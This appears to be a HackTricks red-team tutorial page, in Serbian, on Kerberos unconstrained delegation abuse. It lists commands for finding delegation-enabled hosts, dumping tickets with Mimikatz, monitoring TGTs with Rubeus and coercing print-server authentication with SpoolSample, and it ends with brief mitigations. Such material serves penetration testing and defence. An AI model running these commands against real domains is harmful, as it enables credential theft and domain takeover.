# Unconstrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Unconstrained delegation

Ovo je funkcija koju Administrator domena može postaviti na bilo koji **računar** unutar domena. Tada, svaki put kada se **korisnik prijavi** na računar, **kopija TGT-a** tog korisnika će biti **poslata unutar TGS-a** koji obezbeđuje DC **i sačuvana u memoriji u LSASS-u**. Dakle, ako imate privilegije Administratora na mašini, moći ćete da **izvučete karte i pretvarate se da ste korisnici** na bilo kojoj mašini.

Dakle, ako se administrator domena prijavi na računar sa aktiviranom funkcijom "Unconstrained Delegation", a vi imate lokalne admin privilegije unutar te mašine, moći ćete da izvučete kartu i pretvarate se da ste Administrator domena bilo gde (domen privesc).

Možete **pronaći objekte računara sa ovom atributom** proveravajući da li atribut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) sadrži [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). To možete uraditi sa LDAP filtrima ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, što je ono što powerview radi:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

Učitajte kartu Administratora (ili korisnika žrtve) u memoriju sa **Mimikatz** ili **Rubeus za** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Više informacija: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Više informacija o Unconstrained delegation na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Ako napadač može da **kompromituje računar koji je dozvoljen za "Unconstrained Delegation"**, mogao bi da **prevari** **Print server** da **automatski prijavi** protiv njega **čuvajući TGT** u memoriji servera.\
Tada bi napadač mogao da izvrši **Pass the Ticket napad da se pretvara** da je korisnički račun Print servera.

Da biste naterali print server da se prijavi na bilo koju mašinu, možete koristiti [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ako je TGT sa kontrolera domena, možete izvršiti a[ **DCSync attack**](acl-persistence-abuse/#dcsync) i dobiti sve hešove sa DC-a.\
[**Više informacija o ovom napadu na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Evo drugih načina da pokušate da primorate autentifikaciju:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Ublažavanje

* Ograničite DA/Admin prijave na specifične usluge
* Postavite "Nalog je osetljiv i ne može biti delegiran" za privilegovane naloge.

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
